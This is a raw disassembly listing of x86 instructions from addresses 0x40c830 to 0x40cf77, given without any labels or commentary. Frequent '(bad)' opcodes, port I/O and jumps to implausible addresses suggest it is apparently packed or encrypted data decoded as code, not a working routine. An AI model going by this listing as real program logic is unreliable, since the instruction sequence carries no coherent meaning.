  40c830:	mov    esp,ss
  40c832:	and    eax,0x3e8281da
  40c837:	push   cs
  40c838:	dec    ebx
  40c839:	push   esi
  40c83a:	(bad)  
  40c83b:	stos   BYTE PTR es:[edi],al
  40c83c:	dec    ecx
  40c83d:	shr    dh,cl
  40c83f:	mov    dl,0x8a
  40c841:	dec    eax
  40c842:	xlat   BYTE PTR ds:[ebx]
  40c843:	mov    ebp,0x3c970a5e
  40c848:	les    eax,FWORD PTR [ecx+ebx*4]
  40c84b:	fidivr DWORD PTR [ecx+0x511b6060]
  40c851:	add    DWORD PTR [ebx+ebx*2],0xffffffad
  40c855:	in     al,0xee
  40c857:	and    al,0x5c
  40c859:	adc    DWORD PTR ds:0x38289e47,0x996140f0
  40c863:	hlt    
  40c864:	jne    0x40c89a
  40c866:	in     al,dx
  40c867:	xor    bl,al
  40c869:	xchg   esp,eax
  40c86a:	out    dx,al
  40c86b:	ds push ds
  40c86d:	in     al,0x75
  40c86f:	sbb    cl,al
  40c871:	das    
  40c872:	or     BYTE PTR [ecx-0x595bd23b],ah
  40c878:	push   0x4ba715a9
  40c87d:	inc    ebp
  40c87e:	adc    ah,BYTE PTR [ecx+ebx*2-0x21110f97]
  40c885:	xchg   BYTE PTR [ecx-0x59bd723e],al
  40c88b:	add    ebp,DWORD PTR [ecx]
  40c88d:	mov    eax,ds:0x3398932b
  40c892:	push   ebp
  40c893:	push   DWORD PTR [ebx]
  40c895:	outs   dx,DWORD PTR ds:[esi]
  40c896:	xor    eax,0xd95c1522
  40c89b:	addr16 mov ds:0x4e76,al
  40c89f:	lahf   
  40c8a0:	fldenv [edi+0x5f76dc56]
  40c8a6:	fild   QWORD PTR [esi-0x53]
  40c8a9:	rcr    DWORD PTR [eax],0xab
  40c8ac:	jecxz  0x40c866
  40c8ae:	and    DWORD PTR [ebp+ebx*2-0x4d173567],esp
  40c8b5:	cs aaa 
  40c8b7:	es (bad) 
  40c8b9:	call   0x9a8b:0x5491a33f
  40c8c0:	mov    ebx,eax
  40c8c2:	outs   dx,DWORD PTR ds:[esi]
  40c8c3:	or     edi,DWORD PTR [esi+0x4]
  40c8c6:	dec    ebx
  40c8c7:	pop    ecx
  40c8c8:	pop    ebx
  40c8c9:	add    esp,ebx
  40c8cb:	jae    0x40c94b
  40c8cd:	dec    ebp
  40c8ce:	out    dx,al
  40c8cf:	add    DWORD PTR [esi+esi*4],ebp
  40c8d2:	xchg   ebp,eax
  40c8d3:	retf   0x89da
  40c8d6:	nop
  40c8d7:	mov    eax,ds:0x86003119
  40c8dc:	lock fstp TBYTE PTR [edi+0x2b]
  40c8e0:	dec    edi
  40c8e1:	add    edx,DWORD PTR [edi+0x42]
  40c8e4:	pop    esi
  40c8e5:	hlt    
  40c8e6:	inc    edx
  40c8e7:	xchg   edi,eax
  40c8e8:	fwait
  40c8e9:	div    dl
  40c8eb:	mov    al,ds:0x11779b1f
  40c8f0:	cmp    al,0x3f
  40c8f2:	sbb    eax,0xcd575930
  40c8f7:	fcom   QWORD PTR [edi]
  40c8f9:	sub    BYTE PTR [esi],0xa5
  40c8fc:	mov    ebp,0xca0c715
  40c901:	(bad)  
  40c903:	adc    edi,eax
  40c905:	iret   
  40c906:	dec    esp
  40c907:	mov    WORD PTR [esi+0x13],ds
  40c90a:	int    0x97
  40c90c:	xor    DWORD PTR [edi+0x5c],edx
  40c90f:	popf   
  40c910:	jns    0x40c93b
  40c912:	cmp    esp,DWORD PTR [ecx+0x3e5e8f2d]
  40c918:	pop    ecx
  40c919:	fidiv  DWORD PTR [eax-0x51]
  40c91c:	pop    esi
  40c91d:	pop    ebp
  40c91e:	jp     0x40c91b
  40c920:	mov    cl,BYTE PTR [eax+edi*1]
  40c923:	stos   DWORD PTR es:[edi],eax
  40c924:	fisub  DWORD PTR [eax-0x32]
  40c927:	xor    DWORD PTR [edx+0x52500987],0xfffffffb
  40c92e:	out    dx,al
  40c92f:	test   al,0x25
  40c931:	rol    BYTE PTR [ebx+0x5a26ce1a],cl
  40c937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c938:	cmp    ebp,DWORD PTR [ebx]
  40c93a:	lock fild WORD PTR [ecx+eiz*1-0x56b2538a]
  40c942:	add    BYTE PTR [esi-0x60],bl
  40c945:	inc    eax
  40c946:	outs   dx,BYTE PTR ds:[esi]
  40c947:	pop    edi
  40c948:	(bad)
  40c94b:	je     0x40c935
  40c94d:	sar    BYTE PTR [ecx+eiz*4-0x6a],1
  40c951:	arpl   sp,dx
  40c953:	cmc    
  40c954:	push   ebx
  40c955:	lock cmp al,0x9a
  40c958:	pop    esi
  40c959:	sbb    edi,DWORD PTR [eax]
  40c95b:	cmp    ebp,0xffffff85
  40c95e:	sub    BYTE PTR [ecx+0x6b],0x5f
  40c962:	ds (bad) 
  40c965:	xchg   edi,eax
  40c966:	dec    esi
  40c967:	pop    ss
  40c968:	push   ebp
  40c969:	test   eax,0x6b5e2f98
  40c96e:	out    0x98,al
  40c970:	push   cs
  40c971:	cmp    eax,0x24469f73
  40c976:	sti    
  40c977:	call   0x227e29f5
  40c97c:	push   ss
  40c97d:	fcom   QWORD PTR [edi+ebx*2+0x166395c]
  40c984:	pop    esi
  40c985:	dec    edi
  40c986:	lahf   
  40c987:	(bad)  
  40c988:	push   edi
  40c989:	ja     0x40c9c1
  40c98b:	out    dx,eax
  40c98c:	fwait
  40c98d:	jp     0x40c980
  40c98f:	mov    ds:0xb78a60b9,eax
  40c994:	push   ebp
  40c995:	jecxz  0x40c9ac
  40c997:	pop    ebp
  40c998:	jp     0x40c9e3
  40c99a:	fstp   DWORD PTR [eax]
  40c99c:	pop    edi
  40c99d:	test   DWORD PTR [eax],ecx
  40c99f:	loop   0x40c972
  40c9a1:	out    0xa,eax
  40c9a3:	xor    DWORD PTR ds:0x1ca0ecb0,eax
  40c9a9:	cmp    eax,0x99cebd3a
  40c9ae:	ror    BYTE PTR [ebx+0x5e],cl
  40c9b1:	mov    BYTE PTR [esi],ah
  40c9b3:	dec    ebx
  40c9b4:	xor    eax,0x9ea85127
  40c9b9:	push   edi
  40c9ba:	xchg   esi,eax
  40c9bb:	sbb    eax,0x4a6b644c
  40c9c0:	adc    edi,DWORD PTR [ecx+0x71658f66]
  40c9c6:	push   es
  40c9c7:	mov    al,0x18
  40c9c9:	ss mov eax,0xc609941
  40c9cf:	lahf   
  40c9d0:	(bad)
  40c9d3:	aad    0x60
  40c9d5:	aam    0xee
  40c9d7:	out    0xe8,eax
  40c9d9:	in     al,0xde
  40c9db:	call   0xf203badf
  40c9e0:	xchg   esp,eax
  40c9e1:	pusha  
  40c9e2:	cmp    BYTE PTR [esi+0x3d],bh
  40c9e5:	jnp    0x40c979
  40c9e7:	sbb    eax,0xedebe877
  40c9ec:	adc    al,0xb2
  40c9ee:	inc    esi
  40c9ef:	and    DWORD PTR [ebp-0x11762161],ecx
  40c9f5:	out    dx,eax
  40c9f6:	dec    ebx
  40c9f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9f8:	xchg   ecx,eax
  40c9f9:	into   
  40c9fa:	pop    DWORD PTR [ecx-0x40a9923a]
  40ca00:	sti    
  40ca01:	jo     0x40c9fa
  40ca03:	(bad)  
  40ca04:	in     eax,0x82
  40ca06:	out    dx,al
  40ca07:	je     0x40ca0a
  40ca09:	inc    esp
  40ca0a:	adc    al,0x4e
  40ca0c:	adc    BYTE PTR [edi+0x1b3bc91b],dh
  40ca12:	in     eax,dx
  40ca13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca14:	aad    0x59
  40ca16:	mov    cl,0xc2
  40ca18:	pusha  
  40ca19:	loope  0x40c9f9
  40ca1b:	hlt    
  40ca1c:	mov    WORD PTR [esi+0x5e365fd5],?
  40ca22:	mov    eax,ds:0xf8231f17
  40ca27:	sbb    eax,0xbb297fa3
  40ca2c:	lods   eax,DWORD PTR ds:[esi]
  40ca2d:	mov    BYTE PTR [edi],ah
  40ca2f:	and    bl,BYTE PTR [ebp+0x32]
  40ca32:	xor    dl,BYTE PTR [ebp-0x7a]
  40ca35:	lods   eax,DWORD PTR ds:[esi]
  40ca36:	inc    edx
  40ca37:	or     dh,BYTE PTR [esi-0x51]
  40ca3a:	retf   0x7ba0
  40ca3d:	rcr    BYTE PTR [ebp+0x193e36b9],0x84
  40ca44:	ins    BYTE PTR es:[edi],dx
  40ca45:	dec    ebp
  40ca46:	out    dx,al
  40ca47:	push   ebp
  40ca48:	and    bl,al
  40ca4a:	jmp    0x40ca46
  40ca4c:	mov    ch,0x2b
  40ca4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca4f:	mov    eax,ds:0xa228611
  40ca54:	and    cx,sp
  40ca57:	test   ecx,esi
  40ca59:	jo     0x40ca49
  40ca5b:	(bad)  
  40ca5d:	dec    ecx
  40ca5e:	pop    edi
  40ca5f:	mov    DWORD PTR [edi],ebx
  40ca61:	(bad)  
  40ca62:	test   BYTE PTR [ecx+0x76bd545a],ah
  40ca68:	adc    eax,0x5e51acdf
  40ca6d:	cmp    BYTE PTR [ebx-0x51],0xe
  40ca71:	imul   ebp
  40ca73:	mov    bl,BYTE PTR [ebx+0x61]
  40ca76:	mov    ds:0x744dd340,eax
  40ca7b:	mov    DWORD PTR [eax+0x6073ee38],eax
  40ca81:	and    al,0x3f
  40ca83:	cwde   
  40ca84:	or     esi,0x5d42ae72
  40ca8a:	outs   dx,BYTE PTR ds:[esi]
  40ca8b:	lahf   
  40ca8c:	mov    cs:0x593275ce,eax
  40ca92:	and    al,0x8b
  40ca94:	jns    0x40ca7b
  40ca96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca97:	mov    eax,ds:0xff77774b
  40ca9c:	aaa    
  40ca9d:	(bad)  
  40ca9e:	mov    eax,ds:0x2e8eae4d
  40caa4:	cmp    BYTE PTR [eax+0xd377b9f],cl
  40caaa:	ret    0xa620
  40caad:	ret    0xa8c9
  40cab0:	cmp    DWORD PTR [esi+0x28],ebp
  40cab3:	test   eax,0x57ee9613
  40cab8:	jb     0x40ca97
  40caba:	(bad)  
  40cabb:	or     eax,0x84ed1cc5
  40cac0:	and    DWORD PTR [ebp-0x3f],eax
  40cac3:	xchg   BYTE PTR ds:0xbf34adf,ch
  40cac9:	popa   
  40caca:	sbb    al,0xad
  40cacc:	int3   
  40cacd:	xchg   edx,eax
  40cace:	cmp    al,0x22
  40cad0:	jle    0x40cb26
  40cad2:	out    dx,al
  40cad3:	jb     0x40cacf
  40cad5:	jmp    0x40cb47
  40cad7:	outs   dx,BYTE PTR ds:[esi]
  40cad8:	push   esp
  40cad9:	xor    BYTE PTR [ecx-0x11863b52],dh
  40cadf:	ret    
  40cae0:	repz retf 0x8255
  40cae4:	cmp    ch,BYTE PTR [edi-0x12]
  40cae7:	add    eax,DWORD PTR [ebx]
  40cae9:	ss cmc 
  40caeb:	xchg   esi,eax
  40caec:	mov    ebx,0xbaefe7f
  40caf1:	jne    0x40cb5e
  40caf3:	mov    ecx,0xba80effc
  40caf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caf9:	sub    DWORD PTR [ecx+0x1],esp
  40cafc:	out    dx,al
  40cafd:	and    BYTE PTR cs:[ecx-0x2e],dl
  40cb01:	pusha  
  40cb02:	add    al,0x63
  40cb04:	ds daa 
  40cb06:	dec    ecx
  40cb07:	adc    dh,bl
  40cb09:	pusha  
  40cb0a:	jmp    0x18afec8
  40cb0f:	inc    ebx
  40cb10:	xchg   DWORD PTR [edx-0x12],ebp
  40cb13:	pop    ebp
  40cb14:	outs   dx,DWORD PTR ds:[esi]
  40cb15:	and    BYTE PTR [ebp+esi*8-0x71f785bd],ah
  40cb1c:	cvttps2pi mm5,QWORD PTR [edx-0x60]
  40cb20:	and    al,0x3c
  40cb22:	xchg   ebx,ecx
  40cb24:	les    esi,FWORD PTR [eax-0x6b]
  40cb27:	mov    esi,0x7cef7c5d
  40cb2c:	adc    al,0xc2
  40cb2e:	jmp    0x38c0e273
  40cb33:	adc    edx,DWORD PTR [ecx+0x42]
  40cb36:	dec    edi
  40cb37:	in     al,0x27
  40cb39:	popa   
  40cb3a:	pop    es
  40cb3b:	inc    esp
  40cb3c:	sub    ch,BYTE PTR ss:[edx-0x74]
  40cb40:	pop    esi
  40cb41:	add    eax,0xe048f35e
  40cb46:	retf   
  40cb47:	xor    bh,BYTE PTR [esi-0x54]
  40cb4a:	mov    bh,0xa1
  40cb4c:	test   DWORD PTR ds:0x6502dab6,ecx
  40cb52:	sub    ah,BYTE PTR [ecx-0x7c]
  40cb55:	(bad)  
  40cb56:	out    dx,al
  40cb57:	clc    
  40cb58:	inc    ebx
  40cb59:	inc    eax
  40cb5a:	or     eax,0xe87b18e7
  40cb5f:	sahf   
  40cb60:	dec    sp
  40cb62:	in     al,0xf3
  40cb64:	dec    BYTE PTR [edx-0x5e]
  40cb67:	sub    BYTE PTR cs:[eax],bh
  40cb6a:	or     BYTE PTR es:[eax],dh
  40cb6d:	(bad)  
  40cb6f:	mov    ch,0xf7
  40cb71:	adc    DWORD PTR [esi-0x3a],ecx
  40cb74:	sub    eax,0xfc2915de
  40cb79:	outs   dx,DWORD PTR ds:[esi]
  40cb7a:	inc    esi
  40cb7b:	fdivr  DWORD PTR [ebp+ebx*2-0x4474f26]
  40cb82:	out    dx,al
  40cb83:	sbb    al,BYTE PTR ds:0xa256ffc0
  40cb89:	xor    eax,edx
  40cb8b:	ins    BYTE PTR es:[edi],dx
  40cb8c:	or     ah,BYTE PTR [ecx+0x58]
  40cb8f:	mov    esp,0x4bc72fec
  40cb94:	or     eax,0x7380eedb
  40cb99:	xchg   esi,eax
  40cb9a:	cmp    BYTE PTR [esi-0x5f511e35],cl
  40cba0:	out    dx,al
  40cba1:	sub    eax,0x93217418
  40cba6:	or     al,BYTE PTR [eax+0x22]
  40cba9:	enter  0x9ea8,0x20
  40cbad:	cli    
  40cbae:	mov    ecx,0xef32fa3f
  40cbb3:	or     BYTE PTR [esi-0x5b],0x51
  40cbb7:	dec    ecx
  40cbb8:	mov    eax,ds:0xaf789c60
  40cbbd:	mov    bh,0x7
  40cbbf:	out    0xcd,eax
  40cbc1:	inc    ebp
  40cbc2:	in     eax,dx
  40cbc3:	neg    DWORD PTR [esi]
  40cbc5:	adc    ah,bl
  40cbc7:	xchg   ecx,eax
  40cbc8:	js     0x40cbff
  40cbca:	into   
  40cbcb:	and    BYTE PTR [edx+0x6b29ff51],ch
  40cbd1:	sbb    eax,DWORD PTR [edi+0x47]
  40cbd4:	sbb    esi,DWORD PTR [ecx]
  40cbd6:	sbb    eax,0x52944d36
  40cbdb:	add    DWORD PTR [esi+0x30],ebx
  40cbde:	or     DWORD PTR [edx-0x51],ecx
  40cbe1:	mov    edi,0x2dbbc4af
  40cbe6:	in     al,dx
  40cbe7:	test   al,0x1e
  40cbe9:	or     eax,0x6167b508
  40cbee:	mov    eax,ds:0x806f6449
  40cbf3:	test   al,0x5e
  40cbf5:	idiv   ch
  40cbf7:	inc    edx
  40cbf8:	and    BYTE PTR [ecx-0x1c],bl
  40cbfb:	and    dh,al
  40cbfd:	inc    ecx
  40cbfe:	jecxz  0x40cc56
  40cc00:	ins    BYTE PTR es:[edi],dx
  40cc01:	pusha  
  40cc02:	mov    ch,0xb8
  40cc04:	(bad)  
  40cc05:	jae    0x40cb9f
  40cc07:	cli    
  40cc08:	pop    esi
  40cc09:	(bad)  
  40cc0a:	rcr    BYTE PTR [ebp-0x3758d5ac],1
  40cc10:	inc    edx
  40cc11:	popa   
  40cc12:	or     bl,BYTE PTR [ebx]
  40cc14:	and    al,0xc
  40cc16:	nop
  40cc17:	retf   0x8612
  40cc1a:	inc    DWORD PTR [esi+0x56ee577]
  40cc20:	push   esp
  40cc21:	adc    DWORD PTR [edx-0x669f0a5b],eax
  40cc27:	add    edi,DWORD PTR ds:[ebp+0x5a]
  40cc2b:	mov    cl,0xe0
  40cc2d:	jnp    0x40cc1d
  40cc2f:	dec    edx
  40cc30:	xor    esi,DWORD PTR [ebp+edi*4+0x489944c8]
  40cc37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc38:	fwait
  40cc39:	xchg   ebp,eax
  40cc3a:	leave  
  40cc3b:	mov    cl,0x8a
  40cc3d:	jge    0x40cbde
  40cc3f:	jno    0x40ccb6
  40cc41:	cmp    ecx,edx
  40cc43:	dec    esi
  40cc44:	pop    esi
  40cc45:	fstp   DWORD PTR [eax-0xa]
  40cc48:	xchg   ebp,eax
  40cc49:	lods   eax,DWORD PTR ds:[esi]
  40cc4a:	mov    ebx,DWORD PTR [ebp-0x4a]
  40cc4d:	cs ret 
  40cc4f:	mov    al,ds:0x60a010b7
  40cc54:	xlat   BYTE PTR ds:[ebx]
  40cc55:	pop    ebp
  40cc56:	fild   WORD PTR [edi+0x5e]
  40cc59:	inc    esp
  40cc5a:	out    0x33,al
  40cc5c:	sub    al,0x77
  40cc5e:	stc    
  40cc5f:	or     DWORD PTR [eax+0x60],edi
  40cc62:	gs and eax,0x23a8722e
  40cc68:	fwait
  40cc69:	addr16 out dx,al
  40cc6b:	int3   
  40cc6c:	dec    esi
  40cc6d:	mov    cl,0x21
  40cc6f:	xor    al,0x69
  40cc71:	out    0xe8,eax
  40cc73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc74:	mov    ah,ch
  40cc76:	mov    eax,0x4100ffc0
  40cc7b:	je     0x40cc02
  40cc7d:	sub    esi,0x1723323
  40cc83:	pop    ebp
  40cc84:	idiv   DWORD PTR [edx+0x3b]
  40cc87:	mov    eax,ds:0xa5b6c86d
  40cc8c:	sub    BYTE PTR [edx+0x21],bl
  40cc8f:	push   edx
  40cc90:	pop    esi
  40cc91:	sti    
  40cc92:	addr16 jbe 0x40ccb9
  40cc95:	pop    edi
  40cc96:	sbb    bh,BYTE PTR [edi+0x2b]
  40cc99:	popa   
  40cc9a:	adc    ecx,DWORD PTR [ecx+edi*1]
  40cc9d:	repnz push esi
  40cc9f:	ja     0x40cc5e
  40cca1:	shl    edi,cl
  40cca3:	inc    eax
  40cca4:	push   ds
  40cca5:	out    dx,al
  40cca6:	or     eax,0x92a10ef0
  40ccab:	sbb    al,0x7f
  40ccad:	pop    ebp
  40ccae:	into   
  40ccaf:	cli    
  40ccb0:	lock jne 0x40cc44
  40ccb3:	in     al,0xd5
  40ccb5:	jbe    0x40ccc8
  40ccb7:	push   ecx
  40ccb8:	xor    ecx,DWORD PTR [ebx-0x213b0212]
  40ccbe:	(bad)  [ebx+0x7b60bfec]
  40ccc4:	fsub   DWORD PTR [edi+eiz*4-0x18]
  40ccc8:	fdivp  st(4),st
  40ccca:	pop    edx
  40cccb:	shr    BYTE PTR [eax+0x4a],cl
  40ccce:	sti    
  40cccf:	jb     0x40cd2b
  40ccd1:	push   0x4b1e0326
  40ccd6:	sub    eax,0x366e3148
  40ccdb:	mov    ch,0x2a
  40ccde:	enter  0x4ea1,0xac
  40cce2:	adc    BYTE PTR [esi+0x1a079185],dl
  40cce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccea:	sub    ah,BYTE PTR [ecx-0xa291c8d]
  40ccf0:	dec    eax
  40ccf1:	popa   
  40ccf2:	xor    dh,al
  40ccf4:	fstp   QWORD PTR [ebx+0x53]
  40ccf7:	jo     0x40cc85
  40ccf9:	out    0xee,al
  40ccfb:	es je  0x40cceb
  40ccfe:	pushf  
  40ccff:	ss test esp,ecx
  40cd02:	add    esp,DWORD PTR [ecx+0x137c51f]
  40cd08:	fisubr WORD PTR [ebx+0x5a37e8fc]
  40cd0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd0f:	mov    eax,ds:0xc3f2d7b0
  40cd14:	in     eax,dx
  40cd15:	lock ds jmp 0x16ae2e00
  40cd1c:	loope  0x40ccf7
  40cd1e:	dec    edi
  40cd1f:	fcmove st,st(0)
  40cd21:	popa   
  40cd22:	and    dl,cl
  40cd24:	adc    al,0xe1
  40cd26:	in     al,0xeb
  40cd28:	in     eax,0xf2
  40cd2a:	add    BYTE PTR [ebp-0x4f],cl
  40cd2d:	push   ecx
  40cd2e:	xor    bl,BYTE PTR [ecx+ebp*2-0x7]
  40cd32:	pop    es
  40cd33:	push   ebp
  40cd34:	sub    al,BYTE PTR [esi+0x7d19436e]
  40cd3a:	jmp    0xfcee2ba1
  40cd3f:	mov    WORD PTR [eax],gs
  40cd41:	inc    edx
  40cd42:	es loope 0x40cd9f
  40cd45:	popa   
  40cd46:	dec    eax
  40cd47:	cmp    eax,0x2e94d010
  40cd4c:	mov    ah,0xc2
  40cd4e:	out    dx,al
  40cd4f:	xchg   edi,eax
  40cd50:	and    eax,DWORD PTR [ebp+0x7fb0925c]
  40cd56:	mov    ebx,0x9fd24ca0
  40cd5b:	dec    DWORD PTR gs:[ebx-0x23]
  40cd5f:	iret   
  40cd60:	pop    esi
  40cd61:	add    ebp,ebp
  40cd63:	push   0xeae5c766
  40cd68:	pop    ebx
  40cd69:	inc    ebx
  40cd6a:	aaa    
  40cd6b:	cmp    ebp,DWORD PTR [ecx+eiz*4]
  40cd6e:	pop    ecx
  40cd6f:	stos   DWORD PTR es:[edi],eax
  40cd70:	xchg   edx,eax
  40cd71:	push   es
  40cd72:	clc    
  40cd73:	cmp    eax,0x42601054
  40cd78:	ficom  WORD PTR [esi]
  40cd7a:	xor    bl,BYTE PTR [ebp-0x5dfabe52]
  40cd80:	lds    edi,FWORD PTR [eax]
  40cd82:	dec    ebx
  40cd83:	push   eax
  40cd84:	sub    bh,dh
  40cd86:	aam    0x81
  40cd88:	pop    eax
  40cd89:	mov    cl,0xb9
  40cd8b:	pop    ebx
  40cd8c:	pop    esi
  40cd8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd8e:	push   cs
  40cd8f:	adc    ebp,DWORD PTR cs:[ecx+0x614823de]
  40cd96:	loope  0x40cdda
  40cd98:	pop    ss
  40cd99:	add    al,0xb3
  40cd9b:	cli    
  40cd9c:	mov    eax,ds:0x5ed6566f
  40cda1:	sbb    esp,0x36
  40cda4:	sub    BYTE PTR [eax+0x451b665a],0xf0
  40cdab:	jb     0x40cdfe
  40cdad:	popa   
  40cdae:	jg     0x40ce0d
  40cdb0:	xchg   ebp,eax
  40cdb1:	adc    edi,ebx
  40cdb3:	push   esi
  40cdb4:	or     eax,0x90819664
  40cdb9:	popf   
  40cdba:	in     al,dx
  40cdbb:	ss sbb al,0xd8
  40cdbe:	daa    
  40cdbf:	aad    0x27
  40cdc1:	loope  0x40cd65
  40cdc3:	jne    0x40cd84
  40cdc5:	adc    bl,BYTE PTR [ebx]
  40cdc7:	mov    eax,ds:0x160a4c6c
  40cdcc:	lods   al,BYTE PTR ds:[esi]
  40cdcd:	imul   ecx
  40cdcf:	sbb    bl,BYTE PTR [esi+0x5f]
  40cdd2:	(bad)  
  40cdd3:	jmp    0xb82dd9d6
  40cdd8:	jne    0x40ce3a
  40cdda:	sub    DWORD PTR [esi+0x70],esi
  40cddd:	lods   eax,DWORD PTR ds:[esi]
  40cdde:	(bad)  
  40cddf:	int    0x12
  40cde1:	jecxz  0x40cdd8
  40cde3:	pop    ss
  40cde4:	out    0x6c,al
  40cde6:	push   esi
  40cde7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cde8:	mov    esi,0xb385ef54
  40cded:	mov    es,WORD PTR [edx]
  40cdef:	lea    ebx,[esi-0x8]
  40cdf2:	(bad)  
  40cdf3:	cmp    dh,BYTE PTR [esi+esi*1]
  40cdf6:	clc    
  40cdf7:	mov    eax,ds:0x62598778
  40cdfc:	pop    esp
  40cdfd:	adc    BYTE PTR [edx-0x114b179b],0xc4
  40ce04:	xor    edi,0x41
  40ce07:	and    edi,DWORD PTR [eax]
  40ce09:	dec    ebx
  40ce0a:	mov    ax,ds:0x48545ce6
  40ce10:	popf   
  40ce11:	jns    0x40ce21
  40ce13:	out    dx,eax
  40ce14:	pop    esi
  40ce15:	mov    al,0x5c
  40ce17:	push   es
  40ce18:	jmp    0x52d:0x27518add
  40ce1f:	mov    eax,ds:0x9ff143aa
  40ce24:	pushf  
  40ce25:	jp     0x40ce50
  40ce27:	pop    ss
  40ce28:	pop    esi
  40ce29:	add    BYTE PTR [ecx+0x10d3ab59],bh
  40ce2f:	sbb    ah,BYTE PTR [edi+0x1e52f460]
  40ce35:	in     eax,0x2
  40ce37:	push   cs
  40ce38:	pop    ds
  40ce39:	mov    gs,esi
  40ce3b:	les    edx,FWORD PTR [edi+0x312e0d65]
  40ce41:	out    dx,eax
  40ce42:	sub    BYTE PTR [ecx-0xcb9373f],ah
  40ce48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce49:	jmp    0x40ceaa
  40ce4b:	out    dx,al
  40ce4c:	pop    esi
  40ce4d:	jmp    0xbcafce78
  40ce52:	xor    al,0x3d
  40ce54:	test   BYTE PTR [ebp+0x4],bl
  40ce57:	stc    
  40ce58:	stc    
  40ce59:	retf   0xf491
  40ce5c:	lods   eax,DWORD PTR ds:[esi]
  40ce5d:	adc    eax,0x75e66599
  40ce62:	out    dx,al
  40ce63:	sub    al,0x2a
  40ce65:	pop    eax
  40ce66:	pop    es
  40ce67:	and    bh,bl
  40ce69:	mov    edi,0x6b53a7b8
  40ce6e:	into   
  40ce6f:	mov    ecx,cs
  40ce71:	xor    al,BYTE PTR [eax]
  40ce73:	mov    eax,ds:0x9ca2824f
  40ce78:	inc    esi
  40ce79:	mov    esp,esp
  40ce7b:	cdq    
  40ce7c:	pop    esi
  40ce7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce7e:	jle    0x40ce5f
  40ce80:	mov    eax,ds:0x36019f08
  40ce85:	inc    ebp
  40ce86:	push   edi
  40ce87:	inc    ebp
  40ce88:	dec    ebp
  40ce89:	mov    bl,0x3f
  40ce8b:	mov    eax,ds:0xbbac3f8f
  40ce90:	mov    ecx,0x982000b2
  40ce95:	pop    edx
  40ce96:	jmp    0x40ceab
  40ce98:	jge    0x40cecd
  40ce9a:	stos   DWORD PTR es:[edi],eax
  40ce9b:	push   ds
  40ce9c:	sbb    al,0x5a
  40ce9e:	in     eax,dx
  40ce9f:	inc    eax
  40cea0:	jg     0x40cebc
  40cea2:	xchg   ebx,eax
  40cea3:	mov    cl,0xa9
  40cea5:	mov    dl,BYTE PTR [edx-0x7f]
  40cea8:	pop    esi
  40cea9:	ficom  WORD PTR [esi+0x4a]
  40ceac:	mov    ds:0xf5261f11,eax
  40ceb1:	pusha  
  40ceb2:	les    ebx,FWORD PTR [eax]
  40ceb4:	ret    
  40ceb5:	pop    esp
  40ceb6:	mov    edx,0xe7d84234
  40cebb:	(bad)  
  40cebc:	shl    BYTE PTR ds:0xd575b8ae,0x83
  40cec3:	mov    eax,ds:0x12bf1a6b
  40cec8:	fild   DWORD PTR [eax+eiz*8-0xc]
  40cecc:	aas    
  40cecd:	and    DWORD PTR [ecx+eiz*8],ecx
  40ced0:	adc    BYTE PTR [eax+0x435e5116],dh
  40ced6:	and    DWORD PTR ds:0x8677efb5,0xb0745fd8
  40cee0:	scas   eax,DWORD PTR es:[edi]
  40cee1:	repnz sub ah,BYTE PTR [ebx+ecx*2+0x63ad5cad]
  40cee9:	xor    al,0x58
  40ceeb:	sbb    DWORD PTR [ecx-0x5f6ce920],0xffffffb4
  40cef2:	push   ebp
  40cef3:	stos   BYTE PTR es:[edi],al
  40cef4:	inc    edx
  40cef5:	sub    esp,DWORD PTR [edx]
  40cef7:	repnz jecxz 0x40cf59
  40cefa:	faddp  st(2),st
  40cefc:	ds data16 rcl al,cl
  40cf00:	and    eax,0x73ce0282
  40cf05:	push   ds
  40cf06:	outs   dx,BYTE PTR ds:[esi]
  40cf07:	add    eax,0xffe8c455
  40cf0c:	es jge 0x40ce9f
  40cf0f:	jl     0x40ceaa
  40cf11:	inc    edx
  40cf12:	ret    0x39e0
  40cf15:	pop    esp
  40cf16:	inc    ebx
  40cf17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf18:	mov    BYTE PTR [ebx-0x10c79819],0x9b
  40cf1f:	sbb    cl,BYTE PTR [esi-0x10]
  40cf22:	hlt    
  40cf23:	lock jno 0x40cf85
  40cf26:	xor    dh,ah
  40cf28:	inc    ebp
  40cf29:	ins    DWORD PTR es:[edi],dx
  40cf2a:	rcr    ecx,0x10
  40cf2d:	popf   
  40cf2e:	imul   edi,DWORD PTR [edx+0x5e],0x4d
  40cf32:	mov    dl,0xf6
  40cf34:	das    
  40cf35:	xor    BYTE PTR [esi-0x669ebfc8],dl
  40cf3b:	outs   dx,BYTE PTR ds:[esi]
  40cf3c:	fxch   st(0)
  40cf3e:	pop    gs
  40cf40:	sbb    dl,BYTE PTR [ebx+0x4038ffee]
  40cf46:	sbb    DWORD PTR ds:0xa0d6ee60,0x2e
  40cf4d:	fwait
  40cf4e:	dec    esi
  40cf4f:	add    BYTE PTR [edx+0x5bf9bb2d],0x1
  40cf56:	add    al,0x94
  40cf58:	mov    BYTE PTR [edi+0xb],bh
  40cf5b:	mov    edx,0x59a8e130
  40cf60:	pusha  
  40cf61:	inc    ebp
  40cf62:	xchg   edx,eax
  40cf63:	cdq    
  40cf64:	enter  0xd860,0x2f
  40cf68:	pop    ss
  40cf69:	and    edi,DWORD PTR cs:[ebp+0x5b]
  40cf6d:	or     al,0xf8
  40cf6f:	inc    ecx
  40cf70:	popa   
  40cf71:	mov    ebp,0xb0281a4e
  40cf76:	pop    edi
  40cf77:	pushf  
